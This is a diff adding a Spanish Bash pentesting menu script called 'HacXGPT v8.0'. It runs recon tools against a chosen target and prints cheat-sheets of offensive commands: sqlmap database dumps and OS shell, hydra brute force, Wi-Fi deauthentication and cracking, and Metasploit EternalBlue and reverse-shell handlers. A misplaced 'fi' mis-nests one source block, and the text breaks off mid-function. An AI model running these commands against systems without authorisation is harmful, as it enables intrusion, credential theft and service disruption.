@@ -1,0 +1,2269 @@
+#!/bin/bash
+# HACXGPT v8.0 EXPERTO — MITRE ATT&CK FRAMEWORK COMPLETO
+
+# Cargar datos MITRE ATT&CK (matrices, tácticas, APTs, CVEs)
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+if [[ -f "$SCRIPT_DIR/mitre_data.sh" ]]; then
+    source "$SCRIPT_DIR/mitre_data.sh"
+else
+    echo -e "\e[1;33m⚠️  mitre_data.sh no encontrado. Funciones MITRE desactivadas.\e[0m"
+fi
+
+if [[ -f "$SCRIPT_DIR/mitre_extras_1.sh" ]]; then
+    source "$SCRIPT_DIR/mitre_extras_1.sh"
+fi
+if [[ -f "$SCRIPT_DIR/mitre_extras_2.sh" ]]; then
+    source "$SCRIPT_DIR/mitre_extras_2.sh"
+fi
+if [[ -f "$SCRIPT_DIR/mitre_extras_3.sh" ]]; then
+    source "$SCRIPT_DIR/mitre_extras_3.sh"
+
+# Cargar integracion Ollama
+if [ -f "$SCRIPT_DIR/ollama_integration.sh" ]; then
+    source "$SCRIPT_DIR/ollama_integration.sh"
+fi
+fi
+
+# ============================================
+# MEJORA 4: Manejo de errores con trap
+# ============================================
+trap 'echo -e "\n\e[0;31m⚠️  Script interrumpido. Saliendo...\e[0m"; exit 1' INT TERM
+# trap 'exit_code=$?; if [ $exit_code -ne 0 ]; then echo -e "\e[0;31m⚠️  Error inesperado (código: $exit_code)\e[0m"; fi' ERR
+
+# ============================================
+# MEJORA 1: Colores usando \e en lugar de \033
+# ============================================
+RED='\e[0;31m'
+GREEN='\e[0;32m'
+YELLOW='\e[1;33m'
+BLUE='\e[0;34m'
+PURPLE='\e[0;35m'
+CYAN='\e[0;36m'
+NC='\e[0m' # No Color
+
+# ============================================
+# SISTEMA DE OBJETIVO GLOBAL
+# ============================================
+TARGET=""       # Objetivo global persistente (IP o dominio)
+
+# ============================================
+# MEJORA 6: Variables para guardar resultados
+# ============================================
+SAVE_MODE=false
+OUTPUT_FILE="hacxgpt_$(date +%Y%m%d_%H%M%S).log"
+
+# Valida que el string sea una IP o un dominio válido
+validar_objetivo() {
+    local obj="$1"
+    local ip_regex='^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'
+    local dom_regex='^[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
+    [[ "$obj" =~ $ip_regex || "$obj" =~ $dom_regex ]]
+}
+
+# Pregunta (o reutiliza) el objetivo global antes de entrar a un módulo
+preguntar_objetivo() {
+    if [[ -n "$TARGET" ]]; then
+        echo ""
+        read -p "🎯 Usar objetivo actual [${CYAN}$TARGET${NC}]? (s/n): " _resp
+        [[ "${_resp,,}" != "n" ]] && return 0
+    fi
+    echo ""
+    while true; do
+        read -p "🎯 Introduce objetivo (IP o dominio): " _nuevo
+        if validar_objetivo "$_nuevo"; then
+            TARGET="$_nuevo"
+            OUTPUT_FILE="hacxgpt_${TARGET}_$(date +%Y%m%d_%H%M%S).log"
+            echo -e "${GREEN}✅ Objetivo establecido: ${CYAN}$TARGET${NC}"
+            echo ""
+            return 0
+        fi
+        echo -e "${RED}❌ Formato inválido. Usa IP (ej: 192.168.1.1) o dominio (ej: ejemplo.com)${NC}"
+    done
+}
+
+save_output() {
+    local content="$1"
+    if [[ "$SAVE_MODE" == true ]]; then
+        echo -e "$content" | sed 's/\\e\[[0-9;]*m//g' >> "$OUTPUT_FILE"
+    fi
+}
+
+
+# ============================================
+# MEJORA 2: Validar herramientas instaladas
+# ============================================
+check_command() {
+    local cmd="$1"
+    if ! command -v "$cmd" &>/dev/null; then
+        echo -e "${RED}❌ '$cmd' no está instalado. Instálalo primero.${NC}"
+        return 1
+    fi
+    return 0
+}
+
+# ============================================
+# MEJORA 3: Validar dominio e IP
+# ============================================
+validate_domain() {
+    local domain="$1"
+    if [[ ! "$domain" =~ ^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$ ]]; then
+        echo -e "${RED}❌ Dominio inválido: '$domain'${NC}"
+        return 1
+    fi
+    return 0
+}
+
+validate_ip() {
+    local ip="$1"
+    if [[ ! "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+        echo -e "${RED}❌ IP inválida: '$ip'${NC}"
+        return 1
+    fi
+    IFS='.' read -ra octets <<< "$ip"
+    for oct in "${octets[@]}"; do
+        if (( oct > 255 )); then
+            echo -e "${RED}❌ IP inválida (octeto fuera de rango): '$ip'${NC}"
+            return 1
+        fi
+    done
+    return 0
+}
+
+clear_screen() {
+    clear
+}
+
+show_banner() {
+    clear_screen
+    echo ""
+    echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
+    echo -e "${PURPLE}║           ${CYAN}🛡️ HacXGPT v8.0 EXPERTO${PURPLE}              ║${NC}"
+    echo -e "${PURPLE}║      ${GREEN}MITRE ATT&CK ENTERPRISE FRAMEWORK${PURPLE}        ║${NC}"
+    echo -e "${PURPLE}║      ${YELLOW}RED TEAM · BLUE TEAM · PURPLE TEAM${PURPLE}       ║${NC}"
+    echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
+    echo ""
+}
+
+# ============================================
+# 1. RECONOCIMIENTO BÁSICO (IMPLEMENTADO)
+# ============================================
+reconocimiento_basico() {
+    while true; do
+        show_banner
+        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
+        echo -e "${CYAN}║         ${GREEN}🎯 RECONOCIMIENTO BÁSICO${CYAN}            ║${NC}"
+        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
+        echo ""
+        
+        echo -e "${GREEN}🔍 HERRAMIENTAS DE RECONOCIMIENTO:${NC}"
+        echo ""
+        echo "1. Información WHOIS de dominio"
+        echo "2. Consultas DNS (nslookup)"
+        echo "3. Consultas DNS avanzadas (dig)"
+        echo "4. Buscar subdominios"
+        echo "5. Información de IP"
+        echo "6. Búsqueda de emails"
+        echo "7. Volver al menú principal"
+        echo ""
+        
+        read -p "🎯 Selecciona opción [1-7]: " opcion
+        
+        case $opcion in
+            1)
+                read -p "🌐 Dominio para WHOIS: " dominio
+                if [ -n "$dominio" ] && validate_domain "$dominio"; then
+                    if check_command whois; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Ejecutando: whois $dominio${NC}"
+                        echo ""
+                        output=$(whois "$dominio" | head -50)
+                        echo "$output"
+                        save_output "[WHOIS $dominio]\n$output"
+                    fi
+                fi
+                ;;
+            2)
+                read -p "🌐 Dominio para NSLOOKUP: " dominio
+                if [ -n "$dominio" ] && validate_domain "$dominio"; then
+                    if check_command nslookup; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Ejecutando: nslookup $dominio${NC}"
+                        echo ""
+                        output=$(nslookup "$dominio")
+                        echo "$output"
+                        save_output "[NSLOOKUP $dominio]\n$output"
+                    fi
+                fi
+                ;;
+            3)
+                read -p "🌐 Dominio para DIG: " dominio
+                if [ -n "$dominio" ] && validate_domain "$dominio"; then
+                    if check_command dig; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Ejecutando: dig $dominio ANY${NC}"
+                        echo ""
+                        output=$(dig "$dominio" ANY +short)
+                        echo "$output"
+                        save_output "[DIG $dominio]\n$output"
+                    fi
+                fi
+                ;;
+            4)
+                read -p "🌐 Dominio para buscar subdominios: " dominio
+                if [ -n "$dominio" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🔍 COMANDOS PARA SUBDOMINIOS:${NC}"
+                    echo ""
+                    echo "• subfinder -d $dominio"
+                    echo "• assetfinder --subs-only $dominio"
+                    echo "• amass enum -d $dominio"
+                    echo "• gau $dominio | cut -d '/' -f3 | sort -u"
+                fi
+                ;;
+            5)
+                read -p "📡 Dirección IP para información: " ip
+                if [ -n "$ip" ] && validate_ip "$ip"; then
+                    echo ""
+                    echo -e "${YELLOW}🔍 COMANDOS PARA IP $ip:${NC}"
+                    echo ""
+                    echo "• whois $ip"
+                    echo "• nslookup $ip"
+                    echo "• curl ipinfo.io/$ip"
+                    echo "• ping -c 4 $ip"
+                fi
+                ;;
+            6)
+                read -p "📧 Dominio para buscar emails: " dominio
+                if [ -n "$dominio" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🔍 COMANDOS PARA BUSCAR EMAILS:${NC}"
+                    echo ""
+                    echo "• theHarvester -d $dominio -b google"
+                    echo "• hunter.io (herramienta web)"
+                    echo "• phonebook.cz"
+                    echo "• linkedin.com (búsqueda manual)"
+                fi
+                ;;
+            7)
+                return
+                ;;
+            *)
+                echo -e "${RED}❌ Opción no válida${NC}"
+                ;;
+        esac
+        
+        echo ""
+        read -p "↵ Presiona Enter para continuar..." dummy
+    done
+}
+
+# ============================================
+# 2. ESCANEO WEB (IMPLEMENTADO)
+# ============================================
+escaneo_web() {
+    while true; do
+        show_banner
+        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
+        echo -e "${CYAN}║            ${GREEN}🌐 ESCANEO WEB${CYAN}                   ║${NC}"
+        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
+        echo ""
+        
+        echo -e "${GREEN}🛠️ HERRAMIENTAS DE ESCANEO WEB:${NC}"
+        echo ""
+        echo "1. Detectar tecnologías (whatweb)"
+        echo "2. Escanear vulnerabilidades (nikto)"
+        echo "3. Buscar directorios (dirb/gobuster)"
+        echo "4. Analizar headers HTTP"
+        echo "5. Probar métodos HTTP"
+        echo "6. SSL/TLS análisis"
+        echo "7. Volver al menú principal"
+        echo ""
+        
+        read -p "🎯 Selecciona opción [1-7]: " opcion
+        
+        case $opcion in
+            1)
+                read -p "🌐 URL para whatweb (ej: https://ejemplo.com): " url
+                if [ -n "$url" ]; then
+                    if check_command whatweb; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Ejecutando: whatweb $url${NC}"
+                        echo ""
+                        output=$(whatweb "$url" 2>&1)
+                        echo "$output"
+                        save_output "[WHATWEB $url]\n$output"
+                    fi
+                fi
+                ;;
+            2)
+                read -p "🌐 URL para nikto (ej: https://ejemplo.com): " url
+                if [ -n "$url" ]; then
+                    if check_command nikto; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Ejecutando: nikto -h $url${NC}"
+                        echo ""
+                        output=$(nikto -h "$url" 2>/dev/null)
+                        echo "$output"
+                        save_output "[NIKTO $url]\n$output"
+                    fi
+                fi
+                ;;
+            3)
+                read -p "🌐 URL para buscar directorios: " url
+                if [ -n "$url" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🔍 COMANDOS PARA BUSCAR DIRECTORIOS:${NC}"
+                    echo ""
+                    echo "• gobuster dir -u $url -w /usr/share/wordlists/dirb/common.txt"
+                    echo "• dirb $url"
+                    echo "• ffuf -u $url/FUZZ -w /usr/share/wordlists/dirb/common.txt"
+                    echo "• dirsearch -u $url -e php,html,js,txt"
+                fi
+                ;;
+            4)
+                read -p "🌐 URL para analizar headers: " url
+                if [ -n "$url" ]; then
+                    if check_command curl; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Ejecutando: curl -I $url${NC}"
+                        echo ""
+                        output=$(curl -I "$url" 2>&1)
+                        echo "$output"
+                        save_output "[HEADERS $url]\n$output"
+                    fi
+                fi
+                ;;
+            5)
+                read -p "🌐 URL para probar métodos HTTP: " url
+                if [ -n "$url" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🔍 COMANDOS PARA MÉTODOS HTTP:${NC}"
+                    echo ""
+                    echo "• curl -X OPTIONS $url"
+                    echo "• nmap --script http-methods --script-args http-methods.url-path='/' $url"
+                    echo "• httprint -h $url -s /usr/share/httprint/signatures.txt"
+                fi
+                ;;
+            6)
+                read -p "🌐 Dominio para análisis SSL: " dominio
+                if [ -n "$dominio" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🔍 COMANDOS PARA SSL/TLS:${NC}"
+                    echo ""
+                    echo "• sslscan $dominio"
+                    echo "• testssl.sh $dominio"
+                    echo "• nmap --script ssl-enum-ciphers -p 443 $dominio"
+                    echo "• openssl s_client -connect $dominio:443 -servername $dominio"
+                fi
+                ;;
+            7)
+                return
+                ;;
+            *)
+                echo -e "${RED}❌ Opción no válida${NC}"
+                ;;
+        esac
+        
+        echo ""
+        read -p "↵ Presiona Enter para continuar..." dummy
+    done
+}
+
+# ============================================
+# 3. ANÁLISIS DE RED (IMPLEMENTADO)
+# ============================================
+analisis_red() {
+    while true; do
+        show_banner
+        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
+        echo -e "${CYAN}║           ${GREEN}📡 ANÁLISIS DE RED${CYAN}                ║${NC}"
+        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
+        echo ""
+        
+        echo -e "${GREEN}📊 HERRAMIENTAS DE ANÁLISIS DE RED:${NC}"
+        echo ""
+        echo "1. Escaneo básico de puertos (nmap)"
+        echo "2. Escaneo avanzado de servicios"
+        echo "3. Ping a objetivo"
+        echo "4. Traceroute a objetivo"
+        echo "5. Netstat (conexiones actuales)"
+        echo "6. Capturar tráfico (tcpdump)"
+        echo "7. Volver al menú principal"
+        echo ""
+        
+        read -p "🎯 Selecciona opción [1-7]: " opcion
+        
+        case $opcion in
+            1)
+                read -p "🎯 Objetivo para nmap (IP o dominio): " objetivo
+                if [ -n "$objetivo" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🔍 COMANDOS NMAP BÁSICOS:${NC}"
+                    echo ""
+                    echo "• Escaneo rápido: nmap -F $objetivo"
+                    echo "• Detectar OS: nmap -O $objetivo"
+                    echo "• Todos los puertos: nmap -p- $objetivo"
+                    echo "• Con scripts: nmap -sC $objetivo"
+                fi
+                ;;
+            2)
+                read -p "🎯 Objetivo para escaneo avanzado: " objetivo
+                if [ -n "$objetivo" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🔍 COMANDOS ESCANEO AVANZADO:${NC}"
+                    echo ""
+                    echo "• Versiones de servicio: nmap -sV $objetivo"
+                    echo "• Scripts de vulnerabilidad: nmap --script vuln $objetivo"
+                    echo "• Escaneo UDP: nmap -sU -p 1-100 $objetivo"
+                    echo "• Timing agresivo: nmap -T4 -A $objetivo"
+                fi
+                ;;
+            3)
+                read -p "🎏 Objetivo para ping (IP o dominio): " objetivo
+                if [ -n "$objetivo" ]; then
+                    if check_command ping; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Ejecutando: ping -c 4 $objetivo${NC}"
+                        echo ""
+                        output=$(ping -c 4 "$objetivo" 2>&1)
+                        echo "$output"
+                        save_output "[PING $objetivo]\n$output"
+                    fi
+                fi
+                ;;
+            4)
+                read -p "🎯 Objetivo para traceroute: " objetivo
+                if [ -n "$objetivo" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🔍 Ejecutando: traceroute $objetivo${NC}"
+                    echo ""
+                    traceroute $objetivo 2>/dev/null || echo "Usando tracert..."
+                    tracert $objetivo 2>/dev/null || echo "Comando no disponible"
+                fi
+                ;;
+            5)
+                echo ""
+                echo -e "${YELLOW}🔍 COMANDOS NETSTAT:${NC}"
+                echo ""
+                echo "• Conexiones activas: netstat -tulpn"
+                echo "• Todas las conexiones: netstat -ano"
+                echo "• Estadísticas: netstat -s"
+                echo "• Rutas: netstat -r"
+                ;;
+            6)
+                read -p "🎯 Interfaz para capturar (ej: eth0): " interfaz
+                if [ -n "$interfaz" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🔍 COMANDOS TCPDUMP:${NC}"
+                    echo ""
+                    echo "• Capturar todo: sudo tcpdump -i $interfaz"
+                    echo "• Guardar a archivo: sudo tcpdump -i $interfaz -w captura.pcap"
+                    echo "• Filtrar por puerto: sudo tcpdump -i $interfaz port 80"
+                    echo "• Filtrar por IP: sudo tcpdump -i $interfaz host 192.168.1.1"
+                fi
+                ;;
+            7)
+                return
+                ;;
+            *)
+                echo -e "${RED}❌ Opción no válida${NC}"
+                ;;
+        esac
+        
+        echo ""
+        read -p "↵ Presiona Enter para continuar..." dummy
+    done
+}
+
+# ============================================
+# 4. SUITE DE PENTESTING (IMPLEMENTADO)
+# ============================================
+suite_pentesting() {
+    while true; do
+        show_banner
+        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
+        echo -e "${CYAN}║           ${GREEN}⚔️ SUITE DE PENTESTING${CYAN}            ║${NC}"
+        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
+        echo ""
+        
+        echo -e "${GREEN}🔧 HERRAMIENTAS DE PENTESTING:${NC}"
+        echo ""
+        echo "1. Metasploit Framework"
+        echo "2. SQL Injection (sqlmap)"
+        echo "3. Fuerza Bruta (hydra)"
+        echo "4. XSS Testing (XSStrike)"
+        echo "5. Wifi Hacking (aircrack)"
+        echo "6. John The Ripper"
+        echo "7. Volver al menú principal"
+        echo ""
+        
+        read -p "🎯 Selecciona opción [1-7]: " opcion
+        
+        case $opcion in
+            1)
+                echo ""
+                echo -e "${YELLOW}🔍 METASPLOIT FRAMEWORK:${NC}"
+                echo ""
+                echo "• Iniciar: msfconsole"
+                echo "• Buscar exploit: search [nombre]"
+                echo "• Usar exploit: use exploit/[ruta]"
+                echo "• Mostrar opciones: show options"
+                echo "• Configurar: set RHOSTS [IP]"
+                echo "• Ejecutar: exploit"
+                echo ""
+                echo -e "${BLUE}📚 EJEMPLOS:${NC}"
+                echo "• EternalBlue: use exploit/windows/smb/ms17_010_eternalblue"
+                echo "• Reverse Shell: use exploit/multi/handler"
+                ;;
+            2)
+                read -p "🌐 URL para sqlmap (ej: http://sitio.com?id=1): " url
+                if [ -n "$url" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🔍 SQLMAP COMANDOS:${NC}"
+                    echo ""
+                    echo "• Detectar: sqlmap -u \"$url\""
+                    echo "• Obtener bases de datos: sqlmap -u \"$url\" --dbs"
+                    echo "• Obtener tablas: sqlmap -u \"$url\" -D [db] --tables"
+                    echo "• Dump de datos: sqlmap -u \"$url\" -D [db] -T [tabla] --dump"
+                    echo "• Shell: sqlmap -u \"$url\" --os-shell"
+                fi
+                ;;
+            3)
+                read -p "🎯 Objetivo para fuerza bruta (ej: ssh://192.168.1.1): " objetivo
+                if [ -n "$objetivo" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🔍 HYDRA COMANDOS:${NC}"
+                    echo ""
+                    echo "• SSH: hydra -l usuario -P passlist.txt ssh://$objetivo"
+                    echo "• FTP: hydra -l usuario -P passlist.txt ftp://$objetivo"
+                    echo "• HTTP POST: hydra -l admin -P passlist.txt $objetivo http-post-form"
+                    echo "• RDP: hydra -l administrador -P passlist.txt rdp://$objetivo"
+                fi
+                ;;
+            4)
+                read -p "🌐 URL para XSS testing: " url
+                if [ -n "$url" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🔍 XSSTRIKE COMANDOS:${NC}"
+                    echo ""
+                    echo "• Escaneo básico: python3 xsstrike.py -u \"$url\""
+                    echo "• Crawling: python3 xsstrike.py -u \"$url\" --crawl"
+                    echo "• Blind XSS: python3 xsstrike.py -u \"$url\" --blind"
+                    echo "• Con parámetros: python3 xsstrike.py -u \"$url?param=value\""
+                fi
+                ;;
+            5)
+                echo ""
+                echo -e "${YELLOW}🔍 WIFI HACKING COMANDOS:${NC}"
+                echo ""
+                echo "• Ver interfaces: airmon-ng"
+                echo "• Modo monitor: airmon-ng start wlan0"
+                echo "• Capturar handshake: airodump-ng wlan0mon"
+                echo "• Ataque deauth: aireplay-ng --deauth 10 -a [BSSID] wlan0mon"
+                echo "• Crackear: aircrack-ng -w rockyou.txt captura-01.cap"
+                ;;
+            6)
+                read -p "🔑 Archivo hash para John: " archivo_hash
+                if [ -n "$archivo_hash" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🔍 JOHN THE RIPPER COMANDOS:${NC}"
+                    echo ""
+                    echo "• Identificar hash: john --format=? --list=formats"
+                    echo "• Ataque de diccionario: john --format=[FORMATO] --wordlist=rockyou.txt $archivo_hash"
+                    echo "• Ataque incremental: john --format=[FORMATO] --incremental $archivo_hash"
+                    echo "• Mostrar passwords: john --show $archivo_hash"
+                fi
+                ;;
+            7)
+                return
+                ;;
+            *)
+                echo -e "${RED}❌ Opción no válida${NC}"
+                ;;
+        esac
+        
+        echo ""
+        read -p "↵ Presiona Enter para continuar..." dummy
+    done
+}
+
+# ============================================
+# 5. GENERAR REPORTES (IMPLEMENTADO)
+# ============================================
+generar_reportes() {
+    while true; do
+        show_banner
+        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
+        echo -e "${CYAN}║           ${GREEN}📊 GENERAR REPORTES${CYAN}               ║${NC}"
+        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
+        echo ""
+        
+        echo -e "${GREEN}📝 FORMATOS DE REPORTE:${NC}"
+        echo ""
+        echo "1. Crear reporte HTML básico"
+        echo "2. Crear reporte en texto"
+        echo "3. Crear reporte en PDF"
+        echo "4. Reporte de vulnerabilidades"
+        echo "5. Plantillas personalizadas"
+        echo "6. Volver al menú principal"
+        echo ""
+        
+        read -p "🎯 Selecciona opción [1-6]: " opcion
+        
+        case $opcion in
+            1)
+                read -p "📄 Nombre del reporte HTML (sin extensión): " nombre
+                if [ -n "$nombre" ]; then
+                    echo ""
+                    echo -e "${YELLOW}📝 CREANDO REPORTE HTML:${NC}"
+                    echo ""
+                    cat > "${nombre}.html" << HTMLREPORT
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Reporte de Seguridad - $(date)</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; }
+        h1 { color: #333; }
+        .section { margin: 20px 0; padding: 15px; background: #f5f5f5; }
+        .finding { background: #fff3cd; padding: 10px; margin: 10px 0; }
+        .critical { border-left: 5px solid #dc3545; }
+        .high { border-left: 5px solid #fd7e14; }
+        .medium { border-left: 5px solid #ffc107; }
+        .low { border-left: 5px solid #28a745; }
+    </style>
+</head>
+<body>
+    <h1>🔐 Reporte de Seguridad</h1>
+    <p><strong>Fecha:</strong> $(date)</p>
+    <p><strong>Objetivo Principal:</strong> ${TARGET:-Ninguno}</p>
+    <p><strong>Generado por:</strong> HacXGPT v8.0</p>
+    
+    <div class="section">
+        <h2>📋 Resumen Ejecutivo</h2>
+        <p>Este reporte contiene los hallazgos de seguridad identificados durante la evaluación.</p>
+    </div>
+    
+    <div class="section">
+        <h2>🎯 Hallazgos</h2>
+        <div class="finding critical">
+            <h3>🛑 CRÍTICO: Vulnerabilidad X</h3>
+            <p><strong>Descripción:</strong> Descripción detallada...</p>
+            <p><strong>Recomendación:</strong> Recomendación de remediación...</p>
+        </div>
+        <div class="finding high">
+            <h3>⚠️ ALTO: Vulnerabilidad Y</h3>
+            <p>Descripción...</p>
+        </div>
+    </div>
+    
+    <div class="section">
+        <h2>📊 Métricas</h2>
+        <p>Total de hallazgos: 5</p>
+        <p>Críticos: 1 | Altos: 2 | Medios: 1 | Bajos: 1</p>
+    </div>
+    
+    <div class="section">
+        <h2>🔧 Herramientas Utilizadas</h2>
+        <ul>
+            <li>Nmap - Escaneo de puertos</li>
+            <li>Nikto - Escaneo web</li>
+            <li>SQLMap - Testing SQL Injection</li>
+            <li>Metasploit - Explotación</li>
+        </ul>
+    </div>
+</body>
+</html>
+HTMLREPORT
+                    echo -e "${GREEN}✅ Reporte HTML creado: ${nombre}.html${NC}"
+                fi
+                ;;
+            2)
+                read -p "📄 Nombre del reporte en texto: " nombre
+                if [ -n "$nombre" ]; then
+                    echo ""
+                    echo -e "${YELLOW}📝 CREANDO REPORTE DE TEXTO:${NC}"
+                    echo ""
+                    cat > "${nombre}.txt" << TEXTREPORT
+================================================================
+                    REPORTE DE SEGURIDAD
+================================================================
+Fecha: $(date)
+Objetivo: ${TARGET:-Ninguno}
+Generado por: HacXGPT v8.0
+
+RESUMEN EJECUTIVO
+=================
+Este documento contiene los hallazgos de seguridad identificados
+durante la evaluación técnica.
+
+HALLAZGOS
+=========
+[+] CRÍTICO: Vulnerabilidad X
+    • Descripción: Servicio vulnerable a RCE
+    • Impacto: Alto - Posible compromiso total
+    • Recomendación: Actualizar a versión 2.0.1
+
+[+] ALTO: Configuración insegura
+    • Descripción: Credenciales por defecto
+    • Impacto: Medio - Acceso no autorizado
+    • Recomendación: Cambiar credenciales
+
+HERRAMIENTAS UTILIZADAS
+=======================
+- Nmap 7.91
+- Nikto 2.1.6
+- SQLMap 1.5.2
+- Metasploit 6.0
+
+CONCLUSIONES
+============
+Se recomienda implementar las correcciones en un plazo de 30 días.
+TEXTREPORT
+                    echo -e "${GREEN}✅ Reporte de texto creado: ${nombre}.txt${NC}"
+                fi
+                ;;
+            3)
+                echo ""
+                echo -e "${YELLOW}📝 PARA CREAR PDFS:${NC}"
+                echo ""
+                echo "• Instalar wkhtmltopdf:"
+                echo "  sudo apt install wkhtmltopdf"
+                echo ""
+                echo "• Convertir HTML a PDF:"
+                echo "  wkhtmltopdf reporte.html reporte.pdf"
+                echo ""
+                echo "• Usar pandoc (más formatos):"
+                echo "  pandoc reporte.md -o reporte.pdf"
+                ;;
+            4)
+                echo ""
+                echo -e "${YELLOW}📊 PLANTILLAS DE VULNERABILIDADES:${NC}"
+                echo ""
+                echo "1. SQL Injection:"
+                echo "   • CVSS: 9.8 (CRÍTICO)"
+                echo "   • CWE: CWE-89"
+                echo "   • Remedio: Prepared Statements"
+                echo ""
+                echo "2. XSS:"
+                echo "   • CVSS: 7.5 (ALTO)"
+                echo "   • CWE: CWE-79"
+                echo "   • Remedio: Output Encoding"
+                echo ""
+                echo "3. CSRF:"
+                echo "   • CVSS: 8.0 (ALTO)"
+                echo "   • CWE: CWE-352"
+                echo "   • Remedio: Tokens Anti-CSRF"
+                ;;
+            5)
+                echo ""
+                echo -e "${YELLOW}🎨 PERSONALIZACIÓN DE REPORTES:${NC}"
+                echo ""
+                echo "• Agregar logo de empresa"
+                echo "• Colores corporativos"
+                echo "• Secciones personalizadas"
+                echo "• Firmas digitales"
+                echo "• Métricas específicas"
+                ;;
+            6)
+                return
+                ;;
+            *)
+                echo -e "${RED}❌ Opción no válida${NC}"
+                ;;
+        esac
+        
+        echo ""
+        read -p "↵ Presiona Enter para continuar..." dummy
+    done
+}
+
+# ============================================
+# 6. HERRAMIENTAS AVANZADAS (IMPLEMENTADO)
+# ============================================
+herramientas_avanzadas() {
+    while true; do
+        show_banner
+        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
+        echo -e "${CYAN}║          ${GREEN}🔧 HERRAMIENTAS AVANZADAS${CYAN}           ║${NC}"
+        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
+        echo ""
+        
+        echo -e "${GREEN}⚙️ HERRAMIENTAS ESPECIALIZADAS:${NC}"
+        echo ""
+        echo "1. Análisis de malware"
+        echo "2. Ingeniería inversa"
+        echo "3. Forense digital"
+        echo "4. OSINT (Inteligencia abierta)"
+        echo "5. Automatización de tareas"
+        echo "6. Desarrollo de exploits"
+        echo "7. Volver al menú principal"
+        echo ""
+        
+        read -p "🎯 Selecciona opción [1-7]: " opcion
+        
+        case $opcion in
+            1)
+                echo ""
+                echo -e "${YELLOW}🦠 ANÁLISIS DE MALWARE:${NC}"
+                echo ""
+                echo "• VirusTotal: analyze archivo.exe"
+                echo "• Strings analysis: strings archivo.exe"
+                echo "• PE analysis: peframe archivo.exe"
+                echo "• Sandbox: cuckoo sandbox"
+                echo "• YARA rules: yara -r reglas.yara directorio/"
+                ;;
+            2)
+                echo ""
+                echo -e "${YELLOW}🔬 INGENIERÍA INVERSA:${NC}"
+                echo ""
+                echo "• Desensamblar: objdump -d archivo"
+                echo "• Debugging: gdb archivo"
+                echo "• Análisis estático: radare2 archivo"
+                echo "• Decompilar: Ghidra, IDA Pro"
+                echo "• Análisis de binarios: binwalk archivo"
+                ;;
+            3)
+                echo ""
+                echo -e "${YELLOW}🔍 FORENSE DIGITAL:${NC}"
+                echo ""
+                echo "• Imágenes de disco: dd if=/dev/sda of=imagen.dd"
+                echo "• Análisis de memoria: volatility -f memory.dump"
+                echo "• Recuperación de archivos: photorec"
+                echo "• Análisis de logs: log2timeline"
+                echo "• Autopsy: interfaz gráfica forense"
+                ;;
+            4)
+                echo ""
+                echo -e "${YELLOW}🌐 OSINT - INTELIGENCIA ABIERTA:${NC}"
+                echo ""
+                echo "• Recon-ng: framework OSINT"
+                echo "• Maltego: visualización de datos"
+                echo "• Shodan: shodan search apache"
+                echo "• theHarvester: búsqueda de emails"
+                echo "• spiderfoot: automatización OSINT"
+                ;;
+            5)
+                echo ""
+                echo -e "${YELLOW}🤖 AUTOMATIZACIÓN:${NC}"
+                echo ""
+                echo "• Scripting: bash, python, powershell"
+                echo "• Automatización: ansible, chef, puppet"
+                echo "• Orchestration: terraform"
+                echo "• CI/CD: Jenkins, GitLab CI"
+                echo "• Containers: Docker, Kubernetes"
+                ;;
+            6)
+                echo ""
+                echo -e "${YELLOW}💣 DESARROLLO DE EXPLOITS:${NC}"
+                echo ""
+                echo "• Pattern creation: msf-pattern_create"
+                echo "• Offset calculation: msf-pattern_offset"
+                echo "• Shellcode generation: msfvenom"
+                echo "• Debugging: Immunity Debugger, x64dbg"
+                echo "• Fuzzing: AFL, boofuzz"
+                ;;
+            7)
+                return
+                ;;
+            *)
+                echo -e "${RED}❌ Opción no válida${NC}"
+                ;;
+        esac
+        
+        echo ""
+        read -p "↵ Presiona Enter para continuar..." dummy
+    done
+}
+
+# ============================================
+# 7. CHAT LIBRE (YA IMPLEMENTADO)
+# ============================================
+chat_libre() {
+    # ============================================
+    # MEJORA 5: Chat con arrays asociativos
+    # ============================================
+    
+    # Función para renderizar contenido CHAT_DATA en formato Purple Team
+    _show_chat_topic() {
+        local topic="$1"
+        local title="$2"
